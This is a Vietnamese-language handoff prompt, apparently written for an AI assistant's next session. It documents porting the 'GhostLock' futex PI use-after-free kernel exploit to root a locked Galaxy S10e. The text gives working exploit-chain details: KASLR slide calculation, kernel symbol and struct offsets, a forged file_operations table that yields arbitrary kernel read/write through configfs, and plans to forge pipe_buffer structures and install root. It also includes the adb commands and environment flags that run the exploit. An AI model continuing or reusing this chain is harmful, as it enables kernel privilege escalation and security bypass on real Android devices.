# PROMPT BÀN GIAO — Phiên 4 (GhostLock port SM-G970W / 4.14.190)

> Dán nguyên khối này vào đầu phiên mới. Nguồn sự thật chi tiết: `E:\Library\Desktop\ghostlock\BAN_GIAO.md`
> (§19–§22; **§22 là bản mới nhất**, gồm mọi fix + bằng chứng của phiên 3). Đọc **§22** trước.

## 0. Mục tiêu (KHÔNG đổi)
Root **SM-G970W (Galaxy S10e, Snapdragon 855, kernel 4.14.190, BL khoá cứng)** bằng port **GhostLock**
(CVE-2026-43499, futex PI UAF) — **không mở bootloader**. Trần: `MODULE_SIG_FORCE=y` ⇒ không KernelSU,
chỉ root tạm (+ SELinux off). Repo exploit: WSL `~/ghostlock/ghostlock-oneplus` (mọi patch của phiên 3
**đã áp dụng**, chưa commit; snapshot pre-patch ở `/root/ghostlock/_snap_core/`).

## 1. Trạng thái (đã chứng minh — ĐỪNG làm lại)
- **(A) FOPS REDIRECT ĐÃ CHẠY THẬT + đọc/ghi kernel bất kỳ qua configfs.** Đạt đúng cột mốc:
  `cfi write ret=35`, `cfi read ret=35`, **`cfi fops_before == fake_fops`**, máy **không reboot**.
- **(B) đã vào tới physrw; `leak_kernel_base` PASS; còn tường `page_base`.**
  - `restore_slide_boot_id` OK, `leak_kernel_base` OK (đọc đúng `open/ioctl/mmap/release` của ashmem).
  - `install_pipe_physrw` chạy `pr_cache_gate` nhưng FAIL: `candidate` (cache của `page_base`-region) ≠ kmalloc-2k.
- **Tường hiện tại (B):** `page_base` = trang giả **memfd** (mode-4) nhưng `pipe_physrw.c` cần `page_base`
  là **một vùng `kmalloc-2k` slab** (để forge `pipe_buffer`). → cần đặt `page_base` = một trang kmalloc-2k slab
  (leak — configfs đã cho arbitrary R/W nên có thể quét slab) **hoặc** chỉnh `pr_prepare_pipe_buffers/pr_cache_gate`.
- Pha **W1/W2** (sau mode-4) vẫn crash — việc riêng; `ONLY_FOPS=1` để tránh.

## 2. Chuỗi fix phiên 3 (chi tiết + bằng chứng ở BAN_GIAO §22)
1. **Slide**: `slide = ("Kernel Offset") + 0x80000`; alignment **0x8000**. Lấy runtime bằng `slideprobe`.
2. **Target mode-4 = `canon_addr(ASHMEM_MISC_FOPS)`** (KHÔNG `data_addr` — linear alias cần phys delta không biết).
3. **Walk ghi ra `page+0x319`** (không phải `write_pc`) ⇒ dựng **bảng fops tại `page+0x319`** (repair sau walk);
   `write_pc` = dummy `page+0x100`; `binwrite_target` dời ra `page+0x800`.
4. **Fake fops dùng `.read`/`.write` cũ**, không phải `_iter`:
   - `.read` = **`configfs_read_file`** (`0x002BE46C`; bỏ `to_frag` khi `needs_read_fill=0`);
   - `.write` = **`configfs_write_bin_file`** (`0x002BE96C`);
   - `read_iter/write_iter = 0`. (Nếu đặt sai slot ⇒ `vfs_write` gọi `write_iter(iocb)` ⇒ đọc `iocb+0xd0` ra rác.)
   - `refresh_fake_fops_text()` cũng phải ghi `.read = configfs_read_file`.
5. **Port `struct configfs_buffer`**: `needs_read_fill@0x48, bin_buffer@0x50, bin_buffer_size@0x58, cb_max_size@0x5c`.
6. **`DIRECT_MAP_END` = `0xffffffc400000000`** (cũ = 0 ⇒ `is_direct_ptr()` luôn false ⇒ mọi gate fail).
7. **`data_addr()` → canonical khi có slide** (fix cả `root.c`/`umh_root.c`); `pr_kmalloc_caches()` cũng canonical.
8. **Bỏ gate `show_fdinfo`** trong `leak_kernel_base` (kernel này `ashmem_fops.show_fdinfo=0`).

## 3. Lệnh chạy chuẩn (mỗi boot PHẢI lấy lại slide)
```powershell
$adb='E:\Library\Desktop\platform-tools-latest-windows\platform-tools\adb.exe'
# 0) build (WSL), ĐỔI TÊN mỗi lần:  bash /mnt/e/Library/Desktop/ghostlock/build14.sh /tmp/ghostlockXX
# 1) probe slide (0 rủi ro): IP thứ 2/3 dạng ffffff80<...>bbd4 = el0_svc_naked
& $adb push ghostlockXX_a64 /data/local/tmp/ghostlockXX ; & $adb shell "chmod 755 /data/local/tmp/ghostlockXX"
& $adb shell "cd /data/local/tmp && timeout 40 ./slideprobe > sp.log 2>&1; head -6 sp.log"
#    slide = (IP_el0svc & 0xfffffff) - 0x3bd4   (vd IP ffffff8008243bd4 -> slide 0x240000)
# 2) chạy tách rời; SLIDE=<slide vừa tính>
& $adb shell "cd /data/local/tmp && rm -f gl.log; nohup sh -c 'ONLY_FOPS=1 SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 SLIDE=0x<...> timeout 60 ./ghostlockXX > gl.log 2>&1' >/dev/null 2>&1 & echo STARTED"
#    (thêm CFI_STOP_VERIFY=1 để DỪNG ngay sau fops_before — dùng khi chỉ kiểm (A))
& $adb shell "grep -a -e 'cfi ' -e fops_before -e kaslr -e cache_gate -e 'cfi FAIL' -e ONLY_FOPS /data/local/tmp/gl.log"
```
- `slideprobe_a64` đã có ở `/data/local/tmp/slideprobe`.
- Build: `bash /mnt/e/Library/Desktop/ghostlock/build14.sh /tmp/ghostlockXX` (copy ra `ghostlockXX_a64`).

## 4. Việc kế tiếp (theo thứ tự)
### (B) Gỡ tường `page_base` cho physrw
- `page_base` phải là **một vùng `kmalloc-2k` slab**. Cách (thảo luận trước khi code):
  quét slab **qua chính configfs primitive** (đã có arbitrary R/W): đọc `kmalloc_caches[type][11]`
  (2k cache ptr, đã có `pr_kmalloc_caches()` canonical), rồi đi theo `kmem_cache` → `cpu_slab/partial/node`
  để tìm một slab page (order-3) thuộc kmalloc-2k, đặt `page_base` = page đó.
- Sau khi gate OK ⇒ `pr_prepare_pipe_buffers` + forge `pipe_buffer` (`ops@0x10`, `flags@0x18`) + `anon_pipe_buf_ops`
  (offset `0x17a1600`, khớp kallsyms) ⇒ pipe `read/write` = arbitrary kernel R/W ⇒ `install_umh_root`/`install_android_root`.
- **Sau mỗi thay đổi nhớ `data_addr` đã = canonical** (đừng dùng linear alias cho symbol ảnh).

### (C) Pha W1/W2 crash — chẩn đoán riêng khi cần (không chặn B).

## 5. Cờ & hằng số
- Cờ: `ONLY_FOPS`, `SSOPT_EMPTY`, `SSOPT_FAKE_TASK`, `SSOPT_OWNER0`, `SSOPT_PEEK`, `SSOPT_NO_CFI`,
  `SSOPT_HOLD`, `SSOPT_QUIET_EXIT`, `PSELECT_ROUTE_DELAY_USEC=0`, `ROUTE_SETSOCKOPT=1`, **`SLIDE=0x...`**,
  `WAITER_LO14` (0x3d10), `CFI_STOP_VERIFY`, `WRITE_PC_TEST`, `RBROOT_OFF`/`RBLEFT_OFF` (chẩn đoán), `KPHYS`.
- Hằng chốt: `waiter = (SP & ~0x3fff) | 0x3d10`; `fake_fops = base+0x319`; `write_pc = base+0x100`;
  `page_base` (mode-4) = trang memfd; `misc_fops` canon; `CFG_*` = 0x48/0x50/0x58/0x5c; `DIRECT_MAP_END=0xffffffc400000000`.

## 6. Quy tắc vận hành (đã trả giá)
1. **Slide đổi mỗi boot** ⇒ luôn chạy `slideprobe` trước. Log phải `fsync` (đã có).
2. Chạy **tách rời** (`nohup … &`); sau reboot chờ **2–3 phút**; kiểm `uptime` + mtime `gl.log`.
3. **Walk flaky ~50%** hard-lock (`rt_mutex_adjust_prio_chain+0x1dc`, RCU stall) dù cấu hình không đổi ⇒
   **một run lỗi KHÔNG kết luận được gì** — chạy lại. Nhiều run có thể thrash mà **không tự reboot** ⇒ `adb reboot` thủ công.
4. Đọc dump: chờ 2–3 phút, dump là **ZIP** ⇒ `python3 kp_scan.py <dump>`; tra theo **tên tiến trình**;
   `pc: <sym>` + `panic_msg = Oops PC = <sym>` là căn cứ chính.
5. adb: `E:\Library\Desktop\platform-tools-latest-windows\platform-tools\adb.exe`.

## 7. Đã đóng — ĐỪNG thử lại
`ppoll`; `select()` làm hold; `CONFIG_SYSVIPC=n`; `data_addr` (linear alias) cho symbol ảnh (dùng canonical);
đặt `configfs_{read,write}_bin_file` vào `_iter` slot; `configfs_read_bin_file` cho `.read` (cần `to_frag`);
`rb_leftmost` = node (làm `rb_next` đi vào miscdevice → treo); dựng bảng fops tại `page+0x100`.

## 8. File/đồ nghề phiên 3 (E:\Library\Desktop\ghostlock\ + WSL)
- Probe: `slideprobe.c/_a64` (ở `/data/local/tmp/slideprobe`).
- Build bước cuối: `ghostlockT1..T17_a64`.
- Patch (Windows, chạy trong WSL): `patch_slide_env.py`, `patch_slide_canon.py`, `patch_slide_canon2.py`,
  `patch_repair_fops_page.py`, `_port_cfg.py`, `_fix_rw.py`, `_fix_readfile.py`, `_fix_refresh_read.py`,
  `_fix_dmend.py`, `_fix_kmc.py`, `_fix_dataaddr.py`, `_fix_leakbase.py`, `_fix_showfdinfo.py`, `_add_cfifail.py`,
  `_add_kaslrprint.py`, `_add_pagedump.py`, `_add_buildpg.py`, `_piwait_env.py`, `_add_writepctest.py`, `_fix_repairfn.py`.
- Công cụ đọc dump: `kp_scan.py`, `_faultT.py`, `_grep_dump.py`, `_x25.py`, `_scan*..py`.

*Ghi 2026-10-10 (phiên 3). (A) xong; (B) còn tường `page_base` (kmalloc-2k slab). Chi tiết đầy đủ: `BAN_GIAO.md §22`.*
